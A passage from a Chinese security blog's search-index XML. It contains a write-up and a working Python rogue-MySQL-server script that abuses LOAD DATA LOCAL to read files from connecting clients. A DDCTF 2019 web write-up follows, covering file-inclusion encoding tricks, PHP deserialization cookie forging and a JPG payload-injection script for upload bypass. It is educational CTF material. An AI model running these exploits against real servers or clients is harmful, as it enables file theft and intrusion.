        <tag>study note</tag>
        <tag>Go web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Mysql客户端任意文件读取]]></title>
    <url>%2FWeb%E5%AE%89%E5%85%A8%2FMysql%2FMysql%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96.html</url>
    <content type="text"><![CDATA[关于Mysql客户端任意文件读取的分析利用实践，其中包括对mysql读取客户端文件过程的抓包分析、利用python脚本伪造mysql服务器读取客户端文件 前言之前做DDCTF 2019 Web题的时候，有一题Mysql弱口令的题用到了这个点，故来学习记录一波。 Load Data infile在Mysql的官方文档中，有一项Security Issues with Load Data local（下图），里面提到了两个Load Data local的潜在安全问题，也就是我今天要分析学习的。 英语好的就看官方文档Security Issues with Load Data Local吧。 不想看英文的就来看我结合大佬blog得出的总结吧。简单来讲，就是我们可以利用python或者其他语言伪造一个mysql服务器(监听3306端口)，这个伪造的mysql服务器可以不实现mysql任何功能（除了向客户端回复 greeting package外），当有别的客户端连接上该服务器时，就可以读取该客户端上的任意文件，前提是客户端具有该文件读写权限。 load data infile语法分析mysql的loda data infile语句主要用于读取一个文件的内容并且存入一个表中。通常有两种用法:12load data infile "/etc/passwd" into table TestTable fields terminated by '分隔符';load data local infile "/etc/passwd" into table TestTable fields terminated by '分隔符'; 上面两条语句的区别就是，load data infile是将服务器上的文件(此处指/etc/passwd)插入表中，load data local infile是将客户端的文件插入表中 下面看我的本机执行结果图： 新建一个表test，结构如图示 使用local data infile语句，这里1.txt文件内容为Miracle778:test,可以看到插入成功 使用local data local infile语句，这里因为我连的是本机127.0.0.1的mysql，所以客户端服务器是同一台主机。可以看到，语句执行成功 好像扯多了，下面进入正题吧——如何伪造一个mysql服务端呢？ 抓包分析实验环境要构造一个mysql服务器，那肯定要知道mysql服务器和客户端是怎么通信的。所以我们利用win 10主机上的mysql(5.5.40)做服务端，然后用kali虚拟机做客户端进行连接，过程中开启wireshark抓包。 开始测试 先在客户端kali上新建一个test文件等下用来load data local infile，内容为kali-client:Miracle778，同时把test表的列长度改一下(之前测试时建小了233) 打开wireshark，准备监听3306端口 用kali进行mysql连接，并使用load data local infile语句将文件插入test表里，这里用mysql连接时，注意加上--enable-local-infile选项，否则操作可能不生效。 可以看到wireshark中抓到一系列包 流量分析我们来具体分析分析刚刚所抓到的包。简单来看，一共有这么几步 greeting包，获取服务端的banner 登录请求包 初始化的一些查询，比如select @@version_comment limit 1、show databases、use database之类的 下面让我们来找到关于执行 load data local infile语句的包。第一个包是客户端发起的Request Query，看起来挺正常的。但紧接着，服务端发回一个包含刚刚请求中文件名的包，这里是把/root/桌面/test.txt发回去了然后客户端才开始发送/root/桌面/test.txt文件的内容 对上面过程做个简单梳理，可以得到 如果客户端要用load data local infile 将文件插入表中的话，客户端会先发一个请求包，这个请求包里包含了要插入的文件的路径。而服务器接下来返回一个Response TABULAR包，里面包含文件路径（我猜意思大概是我服务器允许你客户端上传xx文件)，然后客户端得到了许可才开始传输文件。 这就引发思考了，如果服务器返回的Response TABULAR包里的文件路径不是客户端发出的请求包的路径的话，客户端会不会上传服务器指定的文件? 换而言之，如果通过控制服务器，在其返回的Response TABULAR包里更改文件路径，能否实现客户端任意文件读取。答案是肯定的(不然我就不会在这研究分析了，2333) 正如官方文档中提出的安全风险，In theory, a patched server could be built that would tell the client program to transfer a file of the server&#39;s choosing rather than the file named by the client in the LOAD DATA statement.，可以看到，客户端读取哪个文件其实并不是自己说了算的。这里借用一下大佬博客里的举例正常情况: 客户端: hi~ 我把我的test.txt文件插到你的test表中可以么服务端: OK,读取你本地的test.txt文件发给我客户端: 这是文件内容：富强、民主、和谐 被恶意服务器篡改的情况： 客户端: hi~ 我把我的test.txt文件插到你的test表中可以么服务端: OK,读取你本地的user.txt文件发给我客户端: 这是文件内容: Miracle778 173xxxx1416 到这里有人可能要问，即便可以读任意文件，那也要等到客户端发起 LOAD DATA LOCAL INFILE后才能篡改回复要读取的文件路径呀。这里官方文档中也讲到了:&quot;A patched server could in fact reply with a file-transfer request to any statement, not just LOAD DATA LOCAL这句话意思是说伪造的服务端可以在任何时候回复一个 file-transfer 请求，不一定非要是在LOAD DATA LOCAL的时候。但如果想要利用此特性，客户端必须具有 CLIENT_LOCAL_FILES 属性即可以使用load data local infile，这也是为什么在前面kali连接mysql时需要添加–enable-local-infile的原因。 伪造mysql服务端理论分析由前面分析可知，如果想要达到读取客户端任意文件目的的话，伪造的mysql服务端必须能够发送下列几个包。 向mysql client发送Server greeting包 对mysql client的登录包做Accept all authentications响应(即任意用户密码都能登录) 等待 Client 端发送一个Query Package 回复一个file transfer请求 那现在要解决的就是server greeting、auth、file transfer包的格式问题，方便编程构造。server greeting和file transfer的包结构都可以在官方文档中找到 File Transfer数据包格式:Protocol::LOCAL_INFILE_Request官方文档里还附带一张图,由这张图可以发现，我们需要等待一个来自 Client 的查询请求，才能回复这个读文件的请求 官方文档还给了一个example0c 00 00 01 fb 2f 65 74 63 2f 70 61 73 73 77 64 ...../etc/passwd这里前4个字节 0c 00 00 01中 0x0c表示数据包长度，从0xfb后开始算，长度后面的三个字节00 00 01表示数据包的序号。数据包的内容是从第五个字节 0xfb后开始的，0xfb代表包的类型，0xfb后面的就是数据内容了，这里是/etc/passwd 之前抓的file transfer包的格式截图如下，与上面example分析一致 Greeting包官方文档,如果不会构造可以直接拷贝抓到的数据包然后改一下长度、文件名之类的。这里copy下大佬的格式总结1234567891011&apos;\x0a&apos;, # Protocol&apos;6.6.6-lightless_Mysql_Server&apos; + &apos;\0&apos;, # Version&apos;\x36\x00\x00\x00&apos;, # Thread ID&apos;ABCDABCD&apos; + &apos;\0&apos;, # Salt&apos;\xff\xf7&apos;, # Capabilities, CLOSE SSL HERE!&apos;\x08&apos;, # Collation&apos;\x02\x00&apos;, # Server Status&quot;\x0f\x80\x15&quot;, &apos;\0&apos; * 10, # Unknown&apos;ABCDABCD&apos; + &apos;\0&apos;,&quot;mysql_native_password&quot; + &quot;\0&quot; 编写POC这里参考一个国外大佬的简单脚本，可以根据自己抓包的情况简单改改，只要改第10行的端口(非必须),15行greeting、20行的payloadlen、22行的payload。1234567891011121314151617181920212223242526272829303132333435363738394041424344454647#!/usr/bin/python#coding: utf8import socket# linux :filestring = "/root/桌面/test.txt" #这一行并没有什么卵用，估计是记录一下读的哪个文件# windows:#filestring = "C:\\Windows\\system32\\drivers\\etc\\hosts"HOST = "0.0.0.0" # open for eeeeveryone! ^_^PORT = 3307 # 改下端口BUFFER_SIZE = 1024# 原作者的greeting = "\x5b\x00\x00\x00\x0a\x35\x2e\x36\x2e\x32\x38\x2d\x30\x75\x62\x75\x6e\x74\x75\x30\x2e\x31\x34\x2e\x30\x34\x2e\x31\x00\x2d\x00\x00\x00\x40\x3f\x59\x26\x4b\x2b\x34\x60\x00\xff\xf7\x08\x02\x00\x7f\x80\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x68\x69\x59\x5f\x52\x5f\x63\x55\x60\x64\x53\x52\x00\x6d\x79\x73\x71\x6c\x5f\x6e\x61\x74\x69\x76\x65\x5f\x70\x61\x73\x73\x77\x6f\x72\x64\x00"#1 Greetinggreeting = "\x4a\x00\x00\x00\x0a\x35\x2e\x35\x2e\x34\x30\x00\x13\x00\x00\x00\x51\x59\x4a\x48\x67\x51\x3f\x29\x00\xff\xf7\x21\x02\x00\x0f\x80\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x4c\x23\x69\x6a\x56\x50\x6f\x5c\x5e\x45\x7c\x61\x00\x6d\x79\x73\x71\x6c\x5f\x6e\x61\x74\x69\x76\x65\x5f\x70\x61\x73\x73\x77\x6f\x72\x64\x00"#2 Accept all authenticationsauthok = "\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00"#3 Payloadpayloadlen = "\x16" #原payloadlen = "\x0b"padding = "\x00\x00"payload = payloadlen + padding + "\x01\xfb\x2f\x72\x6f\x6f\x74\x2f\xe6\xa1\x8c\xe9\x9d\xa2\x2f\x74\x65\x73\x74\x2e\x74\x78\x74" #原payload = payloadlen + padding + "\x0b\x00\x00\x01\xfb\x2f\x65\x74\x63\x2f\x68\x6f\x73\x74\x73"#/etc/hostss = socket.socket(socket.AF_INET, socket.SOCK_STREAM)s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)s.bind((HOST, PORT))s.listen(1)while True: conn, addr = s.accept() print 'Connection from:', addr conn.send(greeting) while True: data = conn.recv(BUFFER_SIZE) print " ".join("%02x" % ord(i) for i in data) conn.send(authok) data = conn.recv(BUFFER_SIZE) conn.send(payload) print "[*] Payload send!" data = conn.recv(BUFFER_SIZE) if not data: break print "Data received:", data break # Don't leave the connection open. conn.close() 下面我讲一下怎么用这个脚本，即如何改greeting等变量。因为我们是用socket进行发包，我们可以复习一下socket的定义。连接了应用层与传输层。既然socket是连接应用层与传输层的，那传输层、网络层、链路层等的报文部分就不需要我们自己构造了，那就直接复制导出wireshark导出之前抓的server greeting包的应用层部分即可。即构成我上面脚本的第15行的greeting变量第17行的authok认证包，比对下好像没变，不需要改第20-22行的File Transfer包就要结合要访问的文件路径改了。比如我这里，我要读取的文件路径是/root/桌面/test.txt,长度是0x16，22，所以把payloadlen改为\x16,后面内容按上面的方法用wireshark复制导出即可。 脚本测试结果在win10下运行该脚本(脚本中改成监听3307端口),然后用kali连接。可以看到成功读取。 上面是一个简单的脚本，我是为了加深一步理解所以修修补补改了改。理解完了之后，实际用肯定不优先用这个(还要自己改变量，烦的一比)，轮子肯定是不会重造的。 所以这里放一个Github链接:https://github.com/allyshka/Rogue-MySql-Server 这里也放一下这个github项目里python脚本的测试结果 首先也是将脚本的监听端口改一下，然后再在filelist里加想要读的文件。 在win10下开启这个脚本，用kali连接 脚本运行后，会在当前目录下生成mysql.log目录，有客户端连接上后，进行记录，并且将文件读取存入，我们打开mysql.log文件，可以看到成功读取。 参考Abusing MySQL clients to get LFI from the server/clientMySQL LOAD DATA 读取客户端任意文件Read MySQL Client’s File]]></content>
      <categories>
        <category>Web安全</category>
        <category>Mysql</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>Mysql</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ddctf-2019 web]]></title>
    <url>%2FCTF%2FDDCTF%2Fddctf-2019-web.html</url>
    <content type="text"><![CDATA[之前报了DDCTF-2019个人赛，持续7天。算是自己第一个正式参加的ctf比赛吧。趁着环境还在，照着别人的wp再复现学习一遍。 前言第一次报名ctf，无队友。本来的打算一个人瞎鸡儿琢磨，只求看看Web题目，不求能做出来。。最后情况比预期稍微好点吧，最后做出一道130分的web题加签到题，最终131分。虽然只是奔着看看题去的，但是还是被搞得自闭了一波。比赛刚开始那天，web题只放出两三道来，我是尝试做了上图中的，滴~、WEB 签到题。自闭原因是，题目做着做着，一步步进行着，到最后要出flag哪一步，知道他要考什么，因为姿势不对出不来(比如说WEB签到题，我爆出来了eancrykey，也知道要反序列化，但是构造session时，md5对不上。后面看别人的wp才看到，别人都是把源码down下来执行生成session，而我是自己手动构造手动md5自动url编码，所以一直对不上)，说多了都是泪，因为第一天被搞自闭了，后面出的新题我也没怎么看。。。直到经过几天的自我安慰缓过来了才决定来学习一遍。。。 0x01 滴~题目点进去如下图,可以看到url后面参数jpg=xxx，看起来像base64编码将参数jpg的值进行base64解密，发现是双重base64，于是再进行一次base64解密,得到一串十六进制字串将得到的十六进制字串进行解密，得到原文为flag.jpg到这里就猜到应该是文件包含了，文件名先hex加密后再双重base64加密，于是构造index.php按上面加密过程来一遍，得到TmprMlpUWTBOalUzT0RKbE56QTJPRGN3。 于是访问http://117.51.150.246/index.php?jpg=TmprMlpUWTBOalUzT0RKbE56QTJPRGN3,得到index.php的base64加密过的源代码将index.php的源码解码还原出来，得到 index.php1234567891011121314151617181920212223242526&lt;?php/* * https://blog.csdn.net/FengBanLiuYun/article/details/80616607 * Date: July 4,2018 */error_reporting(E_ALL || ~E_NOTICE);header('content-type:text/html;charset=utf-8');if(! isset($_GET['jpg'])) header('Refresh:0;url=./index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09');$file = hex2bin(base64_decode(base64_decode($_GET['jpg'])));echo '&lt;title&gt;'.$_GET['jpg'].'&lt;/title&gt;';$file = preg_replace("/[^a-zA-Z0-9.]+/","", $file);echo $file.'&lt;/br&gt;';$file = str_replace("config","!", $file);echo $file.'&lt;/br&gt;';$txt = base64_encode(file_get_contents($file));echo "&lt;img src='data:image/gif;base64,".$txt."'&gt;&lt;/img&gt;";/* * Can you find the flag file? * */?&gt; 先看代码，可以看到代码对文件名做了过滤，除了字母数字和点号外，其余字符全部替代成空，而且还对config进行替代，换成!。可以猜测，应该是要通过文件包含读取flag，但是flag所在文件名字不知道，按理应该是要给出来的，所以重新看一遍代码，可以看到，在代码开始前的注释里，有一个博客链接，于是访问,但是是一篇讲echo命令的博客。到这我懵了，还以为这题是什么没见过的题型。。于是去搜索了一波，但是并没有找到什么东西。又回到博客，在左边的热门文章看到另一篇文章关于vim异常退出的(当时是只有命令 echo、vim异常退出两篇)，想着可能是别的老哥做题时访问过，可能线索在那篇文章里，于是访问vim这篇博客，一进来就看见评论区···于是想着，线索应该是这篇博客没错了,所以回去看这篇博客内容，发现关键词.practice.txt.swp 当时我是直接去访问的 practice.txt返回404，于是换着访问了 .practice.txt.swp、.practice.txt.swo、.practice.txt.swn都是404，于是心态爆炸，瞎几把又试了几个点开头的swp文件名后还是404，然后自闭了。mdzz，我是傻逼，真是瞎β操作，当时为什么要在前面加点呢。。。后面比赛结束看别人的wp，发现这个文件名是，practice.txt.swp(算是经验不足吃的亏把···)，于是访问http://117.51.150.246/practice.txt.swp，得到线索flag!ddctf.php结合之前index.php的源码分析，可以发现flag!ddctf.php是可以通过构造flagconfigddctf.php进行绕过读源码的，于是将flagconfigddctf.php进行hex、双重base64加密后，进行文件包含读取。base64解密，得到flag!ddctf.php源码123456789101112131415161718&lt;?phpinclude('config.php');$k = 'hello';extract($_GET);if(isset($uid))&#123; $content=trim(file_get_contents($k)); if($uid==$content) &#123; echo $flag; &#125; else &#123; echo'hello'; &#125;&#125;?&gt; 到这就很明显了，利用extract变量覆盖、php://input伪协议，覆盖掉&#36;k与&#36;uid相等。 0x02 WEB签到题点进去看到页面返回提示说没有权限访问按我的直觉和少的可怜的经验，我直接打开了burp抓包看http头部，果然发现，访问auth.php的请求如下图,HTTP请求里有一个ddctf_username的字段为空，结合权限不足的提示来看，直接把ddctf_username赋为admin结果成功突破第一层，得到提示按提示访问 app/fL2XID2i0Cdh.php,得到两个页面的源码 app/Application.php 1234567891011121314151617181920212223242526272829303132333435363738394041424344Class Application &#123; var $path = ''; public function response($data, $errMsg = 'success') &#123; $ret = ['errMsg' =&gt; $errMsg, 'data' =&gt; $data]; $ret = json_encode($ret); header('Content-type: application/json'); echo $ret; &#125; public function auth() &#123; $DIDICTF_ADMIN = 'admin'; if(!empty($_SERVER['HTTP_DIDICTF_USERNAME']) &amp;&amp; $_SERVER['HTTP_DIDICTF_USERNAME'] == $DIDICTF_ADMIN) &#123; $this-&gt;response('您当前当前权限为管理员----请访问:app/fL2XID2i0Cdh.php'); return TRUE; &#125;else&#123; $this-&gt;response('抱歉，您没有登陆权限，请获取权限后访问-----','error'); exit(); &#125; &#125; private function sanitizepath($path) &#123; $path = trim($path); $path=str_replace('../','',$path); $path=str_replace('..\\','',$path); return $path;&#125;public function __destruct() &#123; if(empty($this-&gt;path)) &#123; exit(); &#125;else&#123; $path = $this-&gt;sanitizepath($this-&gt;path); if(strlen($path) !== 18) &#123; exit(); &#125; $this-&gt;response($data=file_get_contents($path),'Congratulations'); &#125; exit();&#125;&#125; app/Session.php 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111include 'Application.php';class Session extends Application &#123; //key建议为8位字符串 var $eancrykey = ''; var $cookie_expiration = 7200; var $cookie_name = 'ddctf_id'; var $cookie_path = ''; var $cookie_domain = ''; var $cookie_secure = FALSE; var $activity = "DiDiCTF"; public function index() &#123; if(parent::auth()) &#123; $this-&gt;get_key(); if($this-&gt;session_read()) &#123; $data = 'DiDI Welcome you %s'; $data = sprintf($data,$_SERVER['HTTP_USER_AGENT']); parent::response($data,'sucess'); &#125;else&#123; $this-&gt;session_create(); $data = 'DiDI Welcome you'; parent::response($data,'sucess'); &#125; &#125; &#125; private function get_key() &#123; //eancrykey and flag under the folder $this-&gt;eancrykey = file_get_contents('../config/key.txt'); &#125; public function session_read() &#123; if(empty($_COOKIE)) &#123; return FALSE; &#125; $session = $_COOKIE[$this-&gt;cookie_name]; if(!isset($session)) &#123; parent::response("session not found",'error'); return FALSE; &#125; $hash = substr($session,strlen($session)-32); $session = substr($session,0,strlen($session)-32); if($hash !== md5($this-&gt;eancrykey.$session)) &#123; parent::response("the cookie data not match",'error'); return FALSE; &#125; $session = unserialize($session); if(!is_array($session) OR !isset($session['session_id']) OR !isset($session['ip_address']) OR !isset($session['user_agent']))&#123; return FALSE; &#125; if(!empty($_POST["nickname"])) &#123; $arr = array($_POST["nickname"],$this-&gt;eancrykey); $data = "Welcome my friend %s"; foreach ($arr as $k =&gt; $v) &#123; $data = sprintf($data,$v); &#125; parent::response($data,"Welcome"); &#125; if($session['ip_address'] != $_SERVER['REMOTE_ADDR']) &#123; parent::response('the ip addree not match'.'error'); return FALSE; &#125; if($session['user_agent'] != $_SERVER['HTTP_USER_AGENT']) &#123; parent::response('the user agent not match','error'); return FALSE; &#125; return TRUE; &#125; private function session_create() &#123; $sessionid = ''; while(strlen($sessionid) &lt; 32) &#123; $sessionid .= mt_rand(0,mt_getrandmax()); &#125; $userdata = array( 'session_id' =&gt; md5(uniqid($sessionid,TRUE)), 'ip_address' =&gt; $_SERVER['REMOTE_ADDR'], 'user_agent' =&gt; $_SERVER['HTTP_USER_AGENT'], 'user_data' =&gt; '', ); $cookiedata = serialize($userdata); $cookiedata = $cookiedata.md5($this-&gt;eancrykey.$cookiedata); $expire = $this-&gt;cookie_expiration + time(); setcookie( $this-&gt;cookie_name, $cookiedata, $expire, $this-&gt;cookie_path, $this-&gt;cookie_domain, $this-&gt;cookie_secure ); &#125;&#125;$ddctf = new Session();$ddctf-&gt;index(); 这两个源码不难理解，session.php意思是，如果cookie存在ddctf_id这个变量的话，就进行检验，校验方法是md5(eancrykey+session)检验完之后，通过unserialize函数反序列化，而Application.php，定义了一个类，而且具有__destruct析构函数，而且析构函数执行一个读取文件的操作，到这里，思路就很清晰了，通过构造cookie中的ddctf_id变量，通过md5校验，执行反序列化操作，读取flag文件。那要解决的问题就很明显了，如何构造ddctf_id使其能够通过md5校验。。这就要求知道eancrykey。而如何得到eancrykey呢，继续看session.php,只需post一个nickname，通过foreach迭代循环，在nickname里包含%s 即可。直接访问app/Session.php，在请求头出加上ddctf_username=admin,得到服务器set的cookie利用这个cookie，post nickname爆出earncrykey:EzblrbNS好的，煞笔的我只做到这步，接下来先说说我接下来的智障错误操作，再说说别人的正确姿势。 我的瞎β憨憨操作我爆出earncrykey的时候，不是想着直接去构造反序列化session，而是对之前爆earncrykey的cookie做了一个手动md5校验(mdzz) 先url解码 本地写个校验脚本 12345678910&lt;?php$session = 'a:4:&#123;s:10:"session_id";s:32:"9925462deae1028ebe7c53985b224b80";s:10:"ip_address";s:12:"60.176.46.18";s:10:"user_agent";s:115:"Mozilla/5.0 (Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36 (KHTML,+like+Gecko)+Chrome/65.0.3325.181+Safari/537.36";s:9:"user_data";s:0:"";&#125;d3f130c5ec7db33ded6cb289caefe4d4';$hash = substr($session,strlen($session)-32);$session = substr($session,0,strlen($session)-32);echo '原session里的: '.$hash;echo '&lt;p&gt;'.$session.'&lt;/p&gt;';$eancrykey = 'EzblrbNS';$t = md5($eancrykey.$session);echo '经eancrykey md5生成的: '.$t;?&gt; 运行结果,竟然不一样，然后我又懵逼了，心想这搞个锤子哟，于是理所当然自闭了。 正确操作看了别人的wp后，我自己总结了一下我之前出错的原因，改了一个本地校验脚本1234567891011&lt;?php$session = urldecode("a%3A4%3A%7Bs%3A10%3A%22session_id%22%3Bs%3A32%3A%229925462deae1028ebe7c53985b224b80%22%3Bs%3A10%3A%22ip_address%22%3Bs%3A12%3A%2260.176.46.18%22%3Bs%3A10%3A%22user_agent%22%3Bs%3A115%3A%22Mozilla%2F5.0+%28Windows+NT+10.0%3B+Win64%3B+x64%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F65.0.3325.181+Safari%2F537.36%22%3Bs%3A9%3A%22user_data%22%3Bs%3A0%3A%22%22%3B%7Dd3f130c5ec7db33ded6cb289caefe4d4");$hash = substr($session,strlen($session)-32);$session = substr($session,0,strlen($session)-32);echo '原session里的: '.$hash;// echo '&lt;p&gt;'.$session.'&lt;/p&gt;';$eancrykey = 'EzblrbNS';$t = md5($eancrykey.$session);echo '&lt;br /&gt;经eancrykey md5生成的: '.$t;?&gt; 可以往上看看，两个代码不同点就在，前面错误操作里&#36;session是我直接用别的工具url解码赋值的，而这个正确操作了的&#36;session则是利用php自带url解码函数解码然后再进行md5。。。我透，真想口吐芬芳。。。。为了弄清楚这两个字符串的区别，可以用下面php代码比较。123456789101112&lt;?php$session = urldecode("a%3A4%3A%7Bs%3A10%3A%22session_id%22%3Bs%3A32%3A%229925462deae1028ebe7c53985b224b80%22%3Bs%3A10%3A%22ip_address%22%3Bs%3A12%3A%2260.176.46.18%22%3Bs%3A10%3A%22user_agent%22%3Bs%3A115%3A%22Mozilla%2F5.0+%28Windows+NT+10.0%3B+Win64%3B+x64%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F65.0.3325.181+Safari%2F537.36%22%3Bs%3A9%3A%22user_data%22%3Bs%3A0%3A%22%22%3B%7Dd3f130c5ec7db33ded6cb289caefe4d4");$test = 'a:4:&#123;s:10:"session_id";s:32:"9925462deae1028ebe7c53985b224b80";s:10:"ip_address";s:12:"60.176.46.18";s:10:"user_agent";s:115:"Mozilla/5.0 (Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36 (KHTML,+like+Gecko)+Chrome/65.0.3325.181+Safari/537.36";s:9:"user_data";s:0:"";&#125;d3f130c5ec7db33ded6cb289caefe4d4';// session是服务器直接set-cookie返回的ddctf_id值，未经url解码,在此处用php函数解码// test 是用别的工具url解码得到的字符串for($i=0;$i&lt;strlen($session);$i++)&#123; if($session[$i]!==$test[$i]) echo '&lt;br /&gt;'.$i.':'.$session[$i].':'.$test[$i];&#125;echo '&lt;br /&gt;'.urldecode('miracle:+:'); //看看php的urldecode函数将+号解怎么解码?&gt; 执行结果如下图,可以看到是空格和加号的区别。 透，php的url解码函数会把+号解码为空格，而python等其他语言将+号不解码 所以就是这么一个小细节，这个题目又特么差一丢丢做出来。。然后在自闭的路上一去不回。 爆flag解决了这个问题后，接下来的就好办了，构造反序列化数据，将Application类的序列化字符串和flag的path加进session里面去，然后生成md5值。还是用php来做吧，不自己手动搞来搞去了(2333~)12345678910111213141516171819202122232425262728293031323334353637383940&lt;?phpClass Application &#123; var $path = ''; public function response($data, $errMsg = 'success') &#123; $ret = ['errMsg' =&gt; $errMsg,'data' =&gt; $data]; $ret = json_encode($ret); header('Content-type: application/json'); echo $ret; &#125; public function auth() &#123; $DIDICTF_ADMIN = 'admin'; if(!empty($_SERVER['HTTP_DIDICTF_USERNAME']) &amp;&amp; $_SERVER['HTTP_DIDICTF_USERNAME'] == $DIDICTF_ADMIN) &#123; $this-&gt;response('您当前当前权限为管理员----请访问:app/fL2XID2i0Cdh.php'); return TRUE; &#125;else&#123; $this-&gt;response('抱歉，您没有登陆权限，请获取权限后访问-----','error'); exit(); &#125; &#125; private function sanitizepath($path) &#123; $path = trim($path); $path=str_replace('../','',$path); $path=str_replace('..\\','',$path); return $path; &#125;&#125;$class = unserialize(urldecode("a%3A4%3A%7Bs%3A10%3A%22session_id%22%3Bs%3A32%3A%229925462deae1028ebe7c53985b224b80%22%3Bs%3A10%3A%22ip_address%22%3Bs%3A12%3A%2260.176.46.18%22%3Bs%3A10%3A%22user_agent%22%3Bs%3A115%3A%22Mozilla%2F5.0+%28Windows+NT+10.0%3B+Win64%3B+x64%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F65.0.3325.181+Safari%2F537.36%22%3Bs%3A9%3A%22user_data%22%3Bs%3A0%3A%22%22%3B%7Dd3f130c5ec7db33ded6cb289caefe4d4"));//urldecode函数里面的数据可以直接访问session页面，让服务器生成，不同主机不同浏览器不同时间生成不用，具体以自己的burp返回响应为准$app = new Application();$secret = "EzblrbNS";$app-&gt;path = "..././config/flag.txt"; //自己猜测，注意要满足长度限制18array_push($class,$app); //将类Application的对象加入进session里面去var_dump(md5($secret.serialize($class)));var_dump(urlencode(serialize($class))); 上述代码执行结果手动拼接一下构成cookie，提交，得到flag 小小总结又是因为一个小问题导致差一步就做出这个题来，惨遭自闭，接连两题自闭，加上自己第一次正式参加ctf，导致接下来的题目都没怎么认真看。心态有待调整(233~),不过毕竟是第一次正式参加ctf，这些小错误也是没有经验导致(zi wo an wei)。。相信以后会好起来的 0x03 Upload-IMG2019-4-24 这个题目作为我唯一一个走大运撞出来的，因为刚好那几天在研究文件上传，所以就这么误打误撞做出来。 用题目给的用户名和密码进去后，是一个简易的文件上传页面既然是文件上传，那就随便先上传个图片看看。于是顺手上传了一张米兔,发现有提示说检测到上传的图片源代码中未包含指定字符串：phpinfo() 那到这里题目目的就很明了了。上传一个图片马，里面包含phpinfo()即可。先尝试构造图片马,这里phpinfo.php文件里内容为 &lt;? phpinfo(); ?&gt;构造完成后上传，发现还是提示说未包含phpinfo();，然后想到图片是不是被二次渲染过了。 在我上一篇blog里，研究了下文件上传二十关，里面的16关就是关于二次渲染的。当时参考了: https://xz.aliyun.com/t/2657这篇文章，里面讲的很详细，这里我也就不多写了。利用国外大佬的脚本跑一下，生成含phpinfo的图片。123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169&lt;?php /* The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled(). It is necessary that the size and quality of the initial image are the same as those of the processed image. 1) Upload an arbitrary image via secured files upload script 2) Save the processed image and launch: jpg_payload.php &lt;jpg_name.jpg&gt; In case of successful injection you will get a specially crafted image, which should be uploaded again. Since the most straightforward injection method is used, the following problems can occur: 1) After the second processing the injected data may become partially corrupted. 2) The jpg_payload.php script outputs "Something's wrong". If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image. Sergey Bobrov @Black2Fan. See also: https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/ */ $miniPayload = "&lt;?=phpinfo();?&gt;"; //这里可以改成你想要插入的代码 if(!extension_loaded('gd') || !function_exists('imagecreatefromjpeg')) &#123; die('php-gd is not installed'); &#125; if(!isset($argv[1])) &#123; die('php jpg_payload.php &lt;jpg_name.jpg&gt;'); &#125; set_error_handler("custom_error_handler"); for($pad = 0; $pad &lt; 1024; $pad++) &#123; $nullbytePayloadSize = $pad; $dis = new DataInputStream($argv[1]); $outStream = file_get_contents($argv[1]); $extraBytes = 0; $correctImage = TRUE; if($dis-&gt;readShort() != 0xFFD8) &#123; die('Incorrect SOI marker'); &#125; while((!$dis-&gt;eof()) &amp;&amp; ($dis-&gt;readByte() == 0xFF)) &#123; $marker = $dis-&gt;readByte(); $size = $dis-&gt;readShort() - 2; $dis-&gt;skip($size); if($marker === 0xDA) &#123; $startPos = $dis-&gt;seek(); $outStreamTmp = substr($outStream, 0, $startPos) . $miniPayload . str_repeat("\0",$nullbytePayloadSize) . substr($outStream, $startPos); checkImage('_'.$argv[1], $outStreamTmp, TRUE); if($extraBytes !== 0) &#123; while((!$dis-&gt;eof())) &#123; if($dis-&gt;readByte() === 0xFF) &#123; if($dis-&gt;readByte !== 0x00) &#123; break; &#125; &#125; &#125; $stopPos = $dis-&gt;seek() - 2; $imageStreamSize = $stopPos - $startPos; $outStream = substr($outStream, 0, $startPos) . $miniPayload . substr( str_repeat("\0",$nullbytePayloadSize). substr($outStream, $startPos, $imageStreamSize), 0, $nullbytePayloadSize+$imageStreamSize-$extraBytes) . substr($outStream, $stopPos); &#125; elseif($correctImage) &#123; $outStream = $outStreamTmp; &#125; else &#123; break; &#125; if(checkImage('payload_'.$argv[1], $outStream)) &#123; die('Success!'); &#125; else &#123; break; &#125; &#125; &#125; &#125; unlink('payload_'.$argv[1]); die('Something\'s wrong'); function checkImage($filename, $data, $unlink = FALSE) &#123; global $correctImage; file_put_contents($filename, $data); $correctImage = TRUE; imagecreatefromjpeg($filename); if($unlink) unlink($filename); return $correctImage; &#125; function custom_error_handler($errno, $errstr, $errfile, $errline) &#123; global $extraBytes, $correctImage; $correctImage = FALSE; if(preg_match('/(\d+) extraneous bytes before marker/', $errstr, $m)) &#123; if(isset($m[1])) &#123; $extraBytes = (int)$m[1]; &#125; &#125; &#125; class DataInputStream &#123; private $binData; private $order; private $size; public function __construct($filename, $order = false, $fromString = false) &#123; $this-&gt;binData = ''; $this-&gt;order = $order; if(!$fromString) &#123; if(!file_exists($filename) || !is_file($filename)) die('File not exists ['.$filename.']'); $this-&gt;binData = file_get_contents($filename); &#125; else &#123; $this-&gt;binData = $filename; &#125; $this-&gt;size = 